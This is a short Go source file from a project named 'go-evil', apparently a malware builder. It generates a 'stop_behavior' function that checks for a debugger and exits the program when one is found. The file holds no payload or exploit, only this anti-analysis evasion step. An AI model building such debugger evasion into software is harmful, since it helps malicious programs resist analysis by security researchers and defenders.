package debugger

import (
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/functions"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
)

// Generate the debugger detection function
func stop_behavior(data_object *json.Json_t) {

	body := []string{
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"os.Exit(42)",
		"}",
		"return toReturn",
	}

	data_object.Add_go_function(functions.Go_func_t{Name: "stop_behavior", Func_type: "null", Return_type: "bool", Gut: body})
	data_object.Add_go_import("os")

}
